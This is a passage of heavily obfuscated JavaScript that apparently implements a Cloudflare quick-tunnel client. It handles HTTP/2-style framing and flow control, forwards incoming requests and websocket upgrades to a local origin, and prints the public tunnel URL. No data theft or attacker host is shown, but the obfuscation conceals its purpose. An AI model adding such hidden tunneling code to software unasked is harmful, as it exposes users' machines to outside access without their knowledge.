                            p[cZ(0x697)],
                            p[cZ(0x4a9)],
                            s,
                            t
                        ]);
                    } catch (u) {
                        k[cZ(0x1cd)](d, new Error(k[cZ(0x3c8)](k[cZ(0x403)], u[cZ(0x322)])));
                    }
                });
            });
        h['on'](b[cU(0x41d)], j => d(new Error('requesting\x20quick\x20tunnel\x20failed:\x20' + j[cU(0x322)]))), h[cU(0x4e5)]();
    });
}
function a0as(a) {
    const d0 = a0aQ;
    return a[d0(0x4a1)](([b, c]) => Buffer[d0(0x3e1)](b, 'utf8')[d0(0x496)](d0(0x4d6))['replace'](/=+$/, '') + ':' + Buffer[d0(0x3e1)](c, d0(0x2fd))[d0(0x496)](d0(0x4d6))[d0(0x4c2)](/=+$/, ''))[d0(0x211)](';');
}
class a0at {
    constructor(a) {
        const d1 = a0aQ, b = {
                'hrvAZ': d1(0x1f5),
                'decjJ': d1(0x5e4),
                'yjIvc': d1(0x4e5),
                'CppEJ': d1(0x63b)
            }, c = b[d1(0x347)]['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                a['on'](b[d1(0x6f6)], f => {
                    const d2 = d1;
                    this['errored'] = f, this[d2(0x54a)]();
                });
                continue;
            case '1':
                a['on'](b[d1(0x317)], () => {
                    const d3 = d1;
                    this[d3(0x1a9)] = !![], this[d3(0x54a)]();
                });
                continue;
            case '2':
                this['errored'] = null;
                continue;
            case '3':
                this[d1(0x1a9)] = ![];
                continue;
            case '4':
                this[d1(0xc3)] = [];
                continue;
            case '5':
                this[d1(0x5b9)] = Buffer[d1(0x36a)](0x0);
                continue;
            case '6':
                a['on'](d1(0x576), f => {
                    const d4 = d1;
                    this[d4(0x5b9)] = this[d4(0x5b9)]['length'] ? Buffer[d4(0x147)]([
                        this[d4(0x5b9)],
                        f
                    ]) : f, this[d4(0x54a)]();
                });
                continue;
            case '7':
                a['on'](b[d1(0x1f9)], () => {
                    const d5 = d1;
                    this[d5(0x1a9)] = !![], this[d5(0x54a)]();
                });
                continue;
            case '8':
                this['socket'] = a;
                continue;
            }
            break;
        }
    }
    [a0aQ(0x54a)]() {
        const d6 = a0aQ, a = {
                'oLLuA': function (b, c) {
                    return b > c;
                },
                'IPQJO': function (b, c) {
                    return b >= c;
                },
                'zJqpP': function (b, c) {
                    return b !== c;
                },
                'dzjBD': d6(0x3fe)
            };
        while (a[d6(0x5ac)](this[d6(0xc3)][d6(0x4a5)], 0x0)) {
            const b = this['waiters'][0x0];
            if (a['IPQJO'](this[d6(0x5b9)][d6(0x4a5)], b['need'])) {
                this[d6(0xc3)][d6(0xb8)]();
                const c = this['buffer'][d6(0x2e4)](0x0, b[d6(0x101)]);
                this[d6(0x5b9)] = this[d6(0x5b9)][d6(0x2e4)](b[d6(0x101)]), b[d6(0xd7)](c);
            } else {
                if (a[d6(0x6b7)](this[d6(0x354)], null))
                    this['waiters']['shift'](), b[d6(0x2dd)](this[d6(0x354)]);
                else {
                    if (this[d6(0x1a9)])
                        this['waiters'][d6(0xb8)](), b[d6(0x2dd)](new Error(a['dzjBD']));
                    else
                        break;
                }
            }
        }
    }
    [a0aQ(0x2d2)](a) {
        const d7 = a0aQ, b = {
                'jrldx': function (c, d) {
                    return c !== d;
                },
                'SockG': function (c, d) {
                    return c >= d;
                },
                'fyhSd': d7(0x3fe)
            };
        if (b[d7(0x766)](this[d7(0x354)], null))
            return Promise[d7(0x2dd)](this[d7(0x354)]);
        if (b[d7(0x757)](this[d7(0x5b9)][d7(0x4a5)], a)) {
            const c = this[d7(0x5b9)][d7(0x2e4)](0x0, a);
            return this[d7(0x5b9)] = this[d7(0x5b9)][d7(0x2e4)](a), Promise['resolve'](c);
        }
        if (this['closed'])
            return Promise[d7(0x2dd)](new Error(b[d7(0x3b4)]));
        return new Promise((d, f) => {
            const d8 = d7;
            this[d8(0xc3)][d8(0x33a)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this[d8(0x54a)]();
        });
    }
}
class a0au {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const d9 = a0aQ, l = {
                'sPxNq': function (m, n) {
                    return m || n;
                }
            };
        this[d9(0x25c)] = a, this[d9(0x440)] = new a0at(a), this['origin'] = b, this[d9(0x538)] = c, this[d9(0x2df)] = d, this[d9(0x63f)] = f, this[d9(0x412)] = g, this[d9(0xb4)] = h, this[d9(0x5f7)] = i, this['showTunnel'] = j, this[d9(0x166)] = l[d9(0x6a4)](k, { 'printed': ![] }), this['decoder'] = new a0ac(), this[d9(0x28a)] = 0xffff, this[d9(0x1bb)] = new Map(), this['peerMaxFrame'] = a0a3, this[d9(0x503)] = new Map(), this[d9(0x52d)] = null, this[d9(0x3a6)] = ![], this[d9(0x32d)] = ![], this['windowWaiters'] = [];
    }
    ['sendFrame'](a, b, c, d = Buffer[a0aQ(0x36a)](0x0)) {
        const da = a0aQ, f = {
                'pBoSo': function (h, i) {
                    return h > i;
                },
                'Rxfld': da(0x427)
            };
        if (f[da(0x172)](d['length'], 0xffffff))
            throw new Error(f['Rxfld']);
        const g = Buffer[da(0x36a)](0x9);
        g[da(0x776)](d['length'], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[da(0x436)](c & 0x7fffffff, 0x5), this[da(0x25c)]['write'](Buffer[da(0x147)]([
            g,
            d
        ]));
    }
    [a0aQ(0x54d)](a, b, c = ![]) {
        const db = a0aQ, d = {
                'wSQfJ': function (h, i) {
                    return h | i;
                }
            }, f = a0af(b), g = d[db(0xc1)](0x4, c ? 0x1 : 0x0);
        this[db(0x200)](0x1, g, a, f);
    }
    [a0aQ(0x27b)](a) {
        const dc = a0aQ, b = {
                'OgSfi': function (c, d) {
                    return c > d;
                }
            };
        if (this[dc(0x28a)] > 0x0 && b[dc(0x132)](this[dc(0x1bb)][dc(0x514)](a) ?? 0xffff, 0x0))
            return Promise['resolve']();
        return new Promise(c => {
            const dd = dc;
            this[dd(0x3be)][dd(0x33a)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    [a0aQ(0x76c)]() {
        const de = a0aQ, a = {
                'ceUoL': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this[de(0x3be)]) {
            const d = this[de(0x1bb)][de(0x514)](c[de(0x109)]) ?? 0xffff;
            a['ceUoL'](this['connectionWindow'], 0x0) && a[de(0x5a3)](d, 0x0) ? c['resolve']() : b[de(0x33a)](c);
        }
        this[de(0x3be)] = b;
    }
    [a0aQ(0x157)]() {
        const df = a0aQ;
        for (const a of this[df(0x3be)]) {
            a['resolve']();
        }
        this['windowWaiters'] = [];
    }
    async [a0aQ(0x40b)](a, b, c = ![]) {
        const dg = a0aQ, d = {
                'Zwkxk': function (h, i) {
                    return h - i;
                },
                'mRPwG': function (h, i) {
                    return h >= i;
                },
                'suKYv': function (h, i) {
                    return h + i;
                },
                'SNLrp': function (h, i) {
                    return h < i;
                }
            }, f = b[dg(0x4a5)];
        let g = 0x0;
        do {
            await this[dg(0x27b)](a);
            if (this[dg(0x3a6)])
                return;
            const h = this[dg(0x1bb)][dg(0x514)](a) ?? 0xffff, i = Math[dg(0x360)](d[dg(0x45d)](f, g), this[dg(0x28a)], h, this[dg(0x54e)]), j = c && d[dg(0x34b)](g + i, f) ? 0x1 : 0x0, k = b[dg(0x2e4)](g, d['suKYv'](g, i));
            this['connectionWindow'] -= i, this[dg(0x1bb)][dg(0x5de)](a, d[dg(0x45d)](h, i)), this[dg(0x200)](0x0, j, a, k), g += i;
        } while (d[dg(0x65f)](g, f));
    }
    ['sendWindowUpdate'](a, b) {
        const dh = a0aQ, c = {
                'hWXcN': function (d, f) {
                    return d > f;
                }
            };
        if (c[dh(0x33c)](b, 0x0)) {
            const d = Buffer[dh(0x36a)](0x4);
            d[dh(0x436)](b & 0x7fffffff, 0x0), this[dh(0x200)](0x8, 0x0, a, d);
        }
    }
    async ['readFrame']() {
        const di = a0aQ, a = {
                'QNySr': function (i, j) {
                    return i & j;
                }
            }, b = await this['reader'][di(0x2d2)](0x9), c = b[di(0x1ab)](0x0, 0x3), d = b[0x3], f = b[0x4], g = a[di(0x5b0)](b['readUInt32BE'](0x5), 0x7fffffff), h = await this[di(0x440)][di(0x2d2)](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async [a0aQ(0x13d)](a, b, c) {
        const dj = a0aQ, d = {
                'FICzQ': function (g, h) {
                    return g & h;
                },
                'RfXIS': function (g, h) {
                    return g > h;
                },
                'HnTGZ': function (g, h) {
                    return g - h;
                },
                'HHdLD': function (g, h) {
                    return g !== h;
                },
                'VCnbw': function (g, h) {
                    return g !== h;
                },
                'gNyGp': dj(0x3ad)
            };
        if (d['FICzQ'](a, 0x8)) {
            const g = c[0x0];
            c = c['subarray'](0x1);
            if (d[dj(0x1a8)](g, c[dj(0x4a5)]))
                throw new Error(dj(0x409));
            c = g ? c[dj(0x2e4)](0x0, d[dj(0x753)](c[dj(0x4a5)], g)) : c;
        }
        d['FICzQ'](a, 0x20) && (c = c[dj(0x2e4)](0x5));
        const f = [c];
        while (!(a & 0x4)) {
            const h = await this[dj(0x603)]();
            if (d[dj(0x120)](h[0x0], 0x9) || d[dj(0x2ba)](h[0x2], b))
                throw new Error(d[dj(0x666)]);
            f[dj(0x33a)](h[0x3]), a = h[0x1];
        }
        return this[dj(0x367)][dj(0x6a9)](Buffer['concat'](f));
    }
    [a0aQ(0x6a1)](a) {
        const dk = a0aQ, b = {
                'aevTA': dk(0x35f),
                'RKUQF': dk(0x5b7)
            };
        if (this[dk(0x52d)] !== null)
            return;
        this['control'] = new a0aw(this, a, this[dk(0xb4)]), this[dk(0x54d)](a, [[
                b[dk(0x314)],
                b[dk(0x610)]
            ]]), this[dk(0x52d)]['start'](this[dk(0x538)], this['tunnelSecret'], this[dk(0x63f)], this['connIndex']);
    }
    ['updateConfig'](a, b) {
        const dl = a0aQ, c = {
                'qGuAi': dl(0x2fd),
                'hORGN': function (g, h, i) {
                    return g(h, i);
                },
                'hAWPc': dl(0x549),
                'tGzqi': dl(0x294),
                'ABQQx': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON['parse'](b[dl(0x4a5)] ? b[dl(0x496)](c[dl(0x643)]) : '{}'), h = c['hORGN'](parseInt, g[dl(0x321)], 0xa);
            !Number[dl(0x43a)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[dl(0x3e1)](JSON['stringify']({ 'latestAppliedVersion': d }));
        this[dl(0x54d)](a, [
            [
                ':status',
                dl(0x5b7)
            ],
            [
                c[dl(0x73e)],
                'application/json'
            ],
            [
                c[dl(0x77e)],
                c[dl(0x777)](String, f[dl(0x4a5)])
            ]
        ]), this['sendData'](a, f, !![]);
    }
    ['requestFinished'](a, b) {
        const dm = a0aQ, c = {
                'wqufR': dm(0x6b3),
                'aGErG': dm(0x22d)
            }, d = c['wqufR'][dm(0x316)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                if (b[dm(0x1af)])
                    return;
                continue;
            case '1':
                this[dm(0x71d)](a, b)[dm(0x6af)](() => {
                });
                continue;
            case '2':
                if (b['websocket'])
                    return;
                continue;
            case '3':
                if (b['upgrade'] === c[dm(0x319)]) {
                    this[dm(0x33b)](a, Buffer[dm(0x147)](b['body']));
                    return;
                }
                continue;
            case '4':
                b[dm(0x1af)] = !![];
                continue;
            }
            break;
        }
    }
    async ['proxyRequest'](a, b) {
        const dn = a0aQ, c = {
                'yiLzE': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'eVpuM': dn(0x294),
                'EDxZJ': dn(0x581),
                'Dcmdb': dn(0x1b4),
                'xFxNm': dn(0x3a2),
                'mGHOX': function (d, f) {
                    return d === f;
                },
                'rhaMP': 'connection',
                'rAAkI': dn(0x2c9),
                'Dbmuw': dn(0x6fb),
                'JNCnE': function (d, f) {
                    return d(f);
                },
                'RmdXB': dn(0x549),
                'pFgYq': function (d, f) {
                    return d(f);
                },
                'itOMv': dn(0x15f),
                'xWioq': function (d, f) {
                    return d + f;
                },
                'NtuOQ': function (d, f) {
                    return d + f;
                },
                'YNUfZ': dn(0x740),
                'tqSXm': dn(0xb9),
                'jKtUF': dn(0x35f),
                'aLnBA': dn(0x12c)
            };
        try {
            const d = await c[dn(0x67a)](a0az, this[dn(0x1d2)], b[dn(0x1c9)], b[dn(0x6aa)], b[dn(0x63c)], Buffer[dn(0x147)](b['body'])), f = [], g = [];
            for (const [k, l] of d['headers']) {
                const m = k[dn(0x2c1)]();
                m === c[dn(0x112)] && g[dn(0x33a)]([
                    m,
                    l
                ]);
                const n = m[dn(0x562)](c[dn(0x699)]) || m[dn(0x562)](c[dn(0x3c4)]) || m['startsWith'](c[dn(0x3e0)]) || m['startsWith'](':');
                (!n || c['mGHOX'](m, c[dn(0x488)]) || c[dn(0x563)](m, c[dn(0x3e9)]) || m === c['Dbmuw']) && f[dn(0x33a)]([
                    m,
                    l
                ]);
            }
            if (!f[dn(0x237)](([o]) => o === dn(0x549))) {
                const o = c[dn(0x717)](a0ao, b[dn(0x6aa)]);
                o && f[dn(0x33a)]([
                    c[dn(0x6c6)],
                    o
                ]);
            }
            const h = c[dn(0xaa)](a0as, f), i = c[dn(0x563)](d[dn(0x261)], 0x65) ? 0xc8 : d[dn(0x261)], j = [
                    [
                        dn(0x35f),
                        c[dn(0xaa)](String, i)
                    ],
                    ...g,
                    [
                        c['itOMv'],
                        h
                    ],
                    [
                        dn(0x21c),
                        '{\x22src\x22:\x22origin\x22,\x22flow_rate_limited\x22:false}'
                    ]
                ];
            this['sendHeaders'](a, j);
            for await (const p of d[dn(0x696)]) {
                await this['sendData'](a, p, ![]);
            }
            await this[dn(0x40b)](a, Buffer[dn(0x36a)](0x0), !![]);
        } catch (q) {
            this[dn(0xb4)][dn(0x641)](c[dn(0x304)](c['NtuOQ'](c['NtuOQ'](c[dn(0x260)], a), c[dn(0xe2)]), q));
            try {
                this['sendHeaders'](a, [[
                        c[dn(0x29d)],
                        c[dn(0x106)]
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0aQ(0x524)]() {
        const dp = a0aQ, a = {
                'iXEwT': dp(0x506),
                'LoPTj': dp(0x5e9),
                'RLEmJ': function (d, f) {
                    return d + f;
                },
                'vwnRI': function (d, f) {
                    return d & f;
                },
                'bUFdY': dp(0x6c3),
                'eaAWf': function (d, f) {
                    return d < f;
                },
                'Isedc': function (d, f) {
                    return d === f;
                },
                'NnBUi': function (d, f) {
                    return d + f;
                },
                'mpvbI': function (d, f) {
                    return d === f;
                },
                'xCeXS': function (d, f) {
                    return d === f;
                },
                'ZJUsn': function (d, f) {
                    return d === f;
                }
            }, b = await this[dp(0x440)]['readExact'](0x18);
        if (!b['equals'](Buffer[dp(0x3e1)](a['iXEwT'])))
            throw new Error(a[dp(0x1f4)]);
        const c = Buffer[dp(0x36a)](0x6);
        c[dp(0x1f6)](0x3, 0x0), c[dp(0x436)](0x64, 0x2), this[dp(0x200)](0x4, 0x0, 0x0, c);
        this[dp(0x4f1)] && !this['tunnelState'][dp(0x68c)] && (process[dp(0x19b)][dp(0x1f8)](a[dp(0x391)](this['tunnelUrl'], '\x0a')), this[dp(0x166)][dp(0x68c)] = !![]);
        try {
            while (!this[dp(0x3a6)]) {
                const [d, f, g, h] = await this[dp(0x603)]();
                if (d === 0x4) {
                    if (!a[dp(0x326)](f, 0x1)) {
                        if (h['length'] % 0x6)
                            throw new Error(a[dp(0x731)]);
                        for (let i = 0x0; a[dp(0x53d)](i, h[dp(0x4a5)]); i += 0x6) {
                            const j = h[dp(0x77b)](i), k = h[dp(0x296)](a[dp(0x391)](i, 0x2));
                            if (a[dp(0x105)](j, 0x4)) {
                                const l = k - 0xffff;
                                for (const m of this[dp(0x1bb)]['keys']()) {
                                    this[dp(0x1bb)][dp(0x5de)](m, Math[dp(0x1a3)](0x0, a['NnBUi'](this['streamWindows'][dp(0x514)](m), l)));
                                }
                            } else
                                a[dp(0x73c)](j, 0x5) && k >= 0x4000 && k <= 0xffffff && (this[dp(0x54e)] = k);
                        }
                        this['sendFrame'](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (d === 0x6) {
                    !(f & 0x1) && this[dp(0x200)](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (d === 0x8) {
                    if (h[dp(0x4a5)] !== 0x4)
                        continue;
                    const n = a[dp(0x326)](h['readUInt32BE'](0x0), 0x7fffffff);
                    a['Isedc'](g, 0x0) ? this['connectionWindow'] += n : this[dp(0x1bb)][dp(0x5de)](g, a[dp(0x439)](this[dp(0x1bb)][dp(0x514)](g) ?? 0xffff, n));
                    this[dp(0x76c)]();
                    continue;
                }
                if (a['xCeXS'](d, 0x3)) {
                    this[dp(0x503)]['delete'](g);
                    continue;
                }
                if (a[dp(0x105)](d, 0x7))
                    break;
                if (a[dp(0x234)](d, 0x1)) {
                    const o = await this[dp(0x13d)](f, g, h);
                    !this[dp(0x1bb)][dp(0x566)](g) && this[dp(0x1bb)][dp(0x5de)](g, 0xffff);
                    this[dp(0x1fe)](g, f, o);
                    continue;
                }
                if (d === 0x0) {
                    this[dp(0x254)](g, f, h);
                    continue;
                }
            }
        } finally {
            this[dp(0x3a6)] = !![], this[dp(0x157)]();
            for (const p of this[dp(0x503)][dp(0x36e)]()) {
                p[dp(0x271)] && p[dp(0x271)]['stop']();
            }
            try {
                this[dp(0x25c)][dp(0x605)]();
            } catch (q) {
            }
        }
    }
    ['handleHeaders'](a, b, c) {
        const dq = a0aQ, d = {
                'KKGUR': dq(0x29a),
                'MXxHC': dq(0xa8),
                'VPcZZ': dq(0x5bb),
                'haibh': ':authority',
                'BIrMq': function (i, j) {
                    return i === j;
                },
                'pkvNt': 'websocket',
                'rXjel': ':protocol',
                'GMuAV': function (i, j) {
                    return i(j);
                },
                'tbWgT': function (i, j) {
                    return i & j;
                }
            }, f = {};
        for (const [i, j] of c) {
            i[dq(0x562)](':') ? f[i] = j : f[i['toLowerCase']()] = j;
        }
        const g = (f[a0a1] || '')[dq(0x5d6)]()[dq(0x2c1)]();
        if (g === a0a2) {
            this[dq(0x6a1)](a);
            b & 0x1 && (this['control'][dq(0x1af)] = !![]);
            return;
        }
        const h = {
            'method': f[d[dq(0x229)]] || d[dq(0x16d)],
            'path': f[d[dq(0x6fc)]] || '/',
            'authority': f[d[dq(0x2cf)]] || '',
            'headers': c[dq(0x72f)](([k]) => !k[dq(0x562)](':')),
            'body': [],
            'upgrade': g,
            'websocket': d['BIrMq'](g, d[dq(0x64a)]) || d[dq(0x45c)]((f[d['rXjel']] || '')[dq(0x2c1)](), d[dq(0x64a)]),
            'ended': d[dq(0xe5)](Boolean, d[dq(0x471)](b, 0x1)),
            'finished': ![]
        };
        this[dq(0x503)]['set'](a, h);
        if (h[dq(0x673)])
            h[dq(0x271)] = new a0av(this, a, h, this[dq(0x1d2)], this['log']), h[dq(0x271)][dq(0x3fb)]();
        else
            h[dq(0x28e)] && this['requestFinished'](a, h);
    }
    [a0aQ(0x254)](a, b, c) {
        const dr = a0aQ, d = {
                'yxahq': function (g, h) {
                    return g === h;
                },
                'cMruX': function (g, h) {
                    return g & h;
                },
                'CuAMI': function (g, h) {
                    return g === h;
                },
                'yTqCS': function (g, h) {
                    return g !== h;
                },
                'NoSyi': function (g, h) {
                    return g(h);
                },
                'PhMuH': function (g, h) {
                    return g & h;
                }
            };
        this[dr(0x73f)](0x0, c[dr(0x4a5)]), this[dr(0x73f)](a, c['length']);
        if (this['control'] !== null && d[dr(0x3eb)](this['control']['streamId'], a)) {
            this[dr(0x52d)][dr(0x55b)](c);
            d[dr(0x6d2)](b, 0x1) && (this[dr(0x52d)][dr(0x1af)] = !![]);
            return;
        }
        const f = this['streams'][dr(0x514)](a);
        if (d[dr(0x62c)](f, undefined))
            return;
        if (d[dr(0x247)](f[dr(0x271)], undefined)) {
            f[dr(0x271)][dr(0x55b)](c, d[dr(0x10f)](Boolean, d[dr(0x6d2)](b, 0x1)));
            return;
        }
        c[dr(0x4a5)] && f[dr(0x696)]['push'](c), d[dr(0x6e6)](b, 0x1) && (f[dr(0x28e)] = !![], this['requestFinished'](a, f));
    }
}
class a0av {
    constructor(a, b, c, d, f) {
        const ds = a0aQ, g = ds(0x14b)[ds(0x316)]('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[ds(0x191)] = c;
                continue;
            case '1':
                this[ds(0x25c)] = null;
                continue;
            case '2':
                this[ds(0x3a6)] = ![];
                continue;
            case '3':
                this[ds(0x109)] = b;
                continue;
            case '4':
                this[ds(0xb4)] = f;
                continue;
            case '5':
                this[ds(0x1fd)] = a;
                continue;
            case '6':
                this[ds(0xc3)] = [];
                continue;
            case '7':
                this[ds(0x1d2)] = d;
                continue;
            case '8':
                this[ds(0x384)] = [];
                continue;
            }
            break;
        }
    }
    ['start']() {
        const dt = a0aQ;
        this[dt(0x524)]()[dt(0x6af)](() => {
        });
    }
    [a0aQ(0x55b)](a, b = ![]) {
        const du = a0aQ;
        a[du(0x4a5)] && this[du(0x384)][du(0x33a)](a), b && this[du(0x384)]['push'](null), this[du(0x661)]();
    }
    [a0aQ(0x640)]() {
        const dv = a0aQ, a = {
                'JDHbj': function (b, c) {
                    return b !== c;
                }
            };
        if (this[dv(0x3a6)])
            return;
        this['stopped'] = !![], this[dv(0x661)]();
        if (a[dv(0x6d7)](this[dv(0x25c)], null))
            try {
                this[dv(0x25c)][dv(0x605)]();
            } catch (b) {
            }
    }
    [a0aQ(0x661)]() {
        const dw = a0aQ, a = {
                'gCDFH': function (b) {
                    return b();
                }
            };
        for (const b of this['waiters']) {
            a['gCDFH'](b);
        }
        this[dw(0xc3)] = [];
    }
    async ['_next']() {
        const dx = a0aQ;
        while (!this['stopped']) {
            if (this[dx(0x384)][dx(0x4a5)])
                return this[dx(0x384)][dx(0xb8)]();
            await new Promise(a => this[dx(0xc3)]['push'](a));
        }
        return null;
    }
    async [a0aQ(0x524)]() {
        const dy = a0aQ, a = {
                'aQhwO': function (b, c) {
                    return b(c);
                },
                'LBGeW': 'content-length',
                'pqFPy': dy(0x581),
                'zzHRA': dy(0x1b4),
                'vkgeo': function (b, c) {
                    return b === c;
                },
                'BjEjf': dy(0x1fd),
                'BFtTa': 'upgrade',
                'SSoWr': function (b, c) {
                    return b === c;
                },
                'uSbYN': dy(0x6fb),
                'nEqcj': function (b, c) {
                    return b === c;
                },
                'ZNSHA': function (b, c) {
                    return b(c);
                },
                'OHUZZ': 'cf-cloudflared-response-headers',
                'ssFGT': dy(0x21c),
                'LziNZ': dy(0x69f),
                'cCKXj': function (b, c) {
                    return b + c;
                },
                'NravU': function (b, c) {
                    return b + c;
                },
                'UaDNa': function (b, c) {
                    return b + c;
                },
                'Jjwot': dy(0x453),
                'szoXL': '\x20failed:\x20',
                'eaYbV': dy(0x35f),
                'vCcsr': '502'
            };
        try {
            this[dy(0x25c)] = await a0ax(this[dy(0x1d2)]), this['sendHandshake']();
            const b = await a['aQhwO'](a0aA, this['sock']), c = [], d = [];
            for (const [i, j] of b[dy(0x63c)]) {
                const k = i[dy(0x2c1)]();
                k === a['LBGeW'] && d[dy(0x33a)]([
                    k,
                    j
                ]);
                const l = k[dy(0x562)](a[dy(0x2f0)]) || k[dy(0x562)](a[dy(0x136)]) || k['startsWith']('cf-proxy-') || k[dy(0x562)](':');
                (!l || a['vkgeo'](k, a[dy(0x691)]) || a[dy(0x212)](k, a[dy(0x5ff)]) || a[dy(0x174)](k, a[dy(0x701)])) && c[dy(0x33a)]([
                    k,
                    j
                ]);
            }
            const f = a[dy(0x417)](a0as, c), g = a[dy(0x4eb)](b[dy(0x261)], 0x65) ? 0xc8 : b[dy(0x261)], h = [
                    [
                        dy(0x35f),
                        a[dy(0x3c6)](String, g)
                    ],
                    ...d,
                    [
                        a[dy(0x28b)],
                        f
                    ],
                    [
                        a['ssFGT'],
                        a['LziNZ']
                    ]
                ];
            this['connection'][dy(0x54d)](this[dy(0x109)], h), this[dy(0x416)]()['catch'](() => {
            }), await this[dy(0x4a4)](b[dy(0x128)]);
        } catch (m) {
            this[dy(0xb4)][dy(0x641)](a[dy(0xd4)](a[dy(0x4f4)](a[dy(0x3b9)](a['Jjwot'], this['streamId']), a[dy(0x50e)]), m));
            try {
                this['connection'][dy(0x54d)](this[dy(0x109)], [[
                        a[dy(0x523)],
                        a[dy(0x4b4)]
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this[dy(0x640)]();
        }
    }
    async [a0aQ(0x4a4)](a) {
        const dz = a0aQ;
        a[dz(0x4a5)] && await this[dz(0x1fd)][dz(0x40b)](this[dz(0x109)], a, ![]);
        for await (const b of this['sock']) {
            if (this['stopped'])
                break;
            await this[dz(0x1fd)]['sendData'](this[dz(0x109)], b, ![]);
        }
        !this[dz(0x3a6)] && await this['connection'][dz(0x40b)](this[dz(0x109)], Buffer[dz(0x36a)](0x0), !![]);
    }
    async [a0aQ(0x416)]() {
        const dA = a0aQ, a = {
                'cFGkF': function (b, c) {
                    return b === c;
                }
            };
        while (!this[dA(0x3a6)]) {
            const b = await this[dA(0x2ea)]();
            if (a[dA(0x24b)](b, null))
                return;
            try {
                this[dA(0x25c)][dA(0x1f8)](b);
            } catch (c) {
                this[dA(0x3a6)] = !![];
                return;
            }
        }
    }
    [a0aQ(0x4fa)]() {
        const dB = a0aQ, a = {
                'BdXxj': function (i, j) {
                    return i + j;
                },
                'YsAix': function (i, j) {
                    return i + j;
                },
                'qFLRh': function (i, j) {
                    return i + j;
                },
                'nOBBL': dB(0x72e),
                'kqGFq': function (i, j) {
                    return i === j;
                },
                'zKMxV': dB(0x5f8),
                'ldbAq': 'connection',
                'NaWBu': 'upgrade',
                'QKxFM': dB(0x335),
                'PGwaz': dB(0xda),
                'TbSTV': function (i, j) {
                    return i === j;
                },
                'scGbS': function (i, j) {
                    return i + j;
                },
                'MmUUZ': function (i, j) {
                    return i + j;
                },
                'GdDYv': dB(0x3ea),
                'zBHiN': function (i, j) {
                    return i + j;
                },
                'KmOVH': dB(0x72a),
                'nITEp': function (i, j) {
                    return i + j;
                },
                'kKIRu': 'Sec-WebSocket-Key:\x20',
                'rfKvR': dB(0x4d6),
                'MInPw': 'Sec-WebSocket-Version:\x2013',
                'hATWX': 'Connection:\x20Upgrade',
                'oJfnN': dB(0x6bd)
            }, b = new URL(this[dB(0x1d2)]), c = this[dB(0x191)][dB(0x6aa)][dB(0x562)]('/') ? this['request'][dB(0x6aa)] : a[dB(0xcc)]('/', this[dB(0x191)][dB(0x6aa)]), d = [a[dB(0x433)](a[dB(0x1ee)](dB(0x732), c), a['nOBBL'])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[dB(0x191)]['headers']) {
            const k = i[dB(0x2c1)]();
            if (a[dB(0x70c)](k, a[dB(0x49b)]) || a[dB(0x70c)](k, a['ldbAq']) || a[dB(0x70c)](k, a['NaWBu']) || k === 'content-length' || a[dB(0x70c)](k, 'transfer-encoding'))
                continue;
            if (k === a[dB(0x399)])
                f = !![];
            else {
                if (a['kqGFq'](k, a[dB(0x3e4)]))
                    g = !![];
                else
                    a[dB(0x620)](k, 'origin') && (h = !![]);
            }
            d[dB(0x33a)](a[dB(0x1e9)](a['MmUUZ'](i, ':\x20'), j));
        }
        d[dB(0x33a)](a[dB(0x3d4)] + b['host']), !h && this[dB(0x191)][dB(0x525)] && d['push'](a[dB(0x40c)](a[dB(0x6f4)], this[dB(0x191)][dB(0x525)])), !f && d[dB(0x33a)](a[dB(0x651)](a[dB(0x618)], a0k[dB(0x36f)](0x10)[dB(0x496)](a[dB(0x4ea)]))), !g && d['push'](a[dB(0x245)]), d[dB(0x33a)](a[dB(0x77f)]), d[dB(0x33a)](dB(0x378)), this['sock'][dB(0x1f8)](Buffer[dB(0x3e1)](a[dB(0x40c)](d[dB(0x211)]('\x0d\x0a'), a[dB(0x313)]), dB(0x21e)));
    }
}
class a0aw {
    constructor(a, b, c) {
        const dC = a0aQ, d = dC(0x425)['split']('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this[dC(0x5b9)] = Buffer[dC(0x36a)](0x0);
                continue;
            case '1':
                this[dC(0x1af)] = ![];
                continue;
            case '2':
                this[dC(0xb4)] = c;
                continue;
            case '3':
                this[dC(0x1fd)] = a;
                continue;
            case '4':
                this[dC(0x109)] = b;
                continue;
            }
            break;
        }
    }
    ['start'](a, b, c, d) {
        const dD = a0aQ, f = {
                'ZsBAI': function (g, h) {
                    return g(h);
                },
                'lGswD': function (g, h, i, j, k, l, m) {
                    return g(h, i, j, k, l, m);
                }
            };
        this[dD(0x1fd)]['sendData'](this[dD(0x109)], f[dD(0x66d)](a0ah, 0x0), ![]), this[dD(0x1fd)][dD(0x40b)](this['streamId'], f[dD(0x201)](a0ai, 0x1, 0x0, a, b, c, d), ![]);
    }
    [a0aQ(0x55b)](a) {
        const dE = a0aQ, b = {
                'jfaqy': function (f, g) {
                    return f(g);
                },
                'nOrft': function (f, g) {
                    return f(g);
                },
                'dtCaS': function (f, g) {
                    return f + g;
                },
                'MkueH': dE(0x4ce),
                'bjJhJ': dE(0x26d),
                'Kjqfc': function (f, g) {
                    return f + g;
                },
                'BbwyY': dE(0xaf),
                'eEDvi': dE(0x655),
                'bJQbz': dE(0x1ff)
            };
        this[dE(0x5b9)] = this[dE(0x5b9)][dE(0x4a5)] ? Buffer['concat']([
            this[dE(0x5b9)],
            a
        ]) : a;
        let c, d;
        [c, d] = b[dE(0x754)](a0aj, this[dE(0x5b9)]), this['buffer'] = d;
        for (const f of c) {
            try {
                const g = b[dE(0x305)](a0am, f);
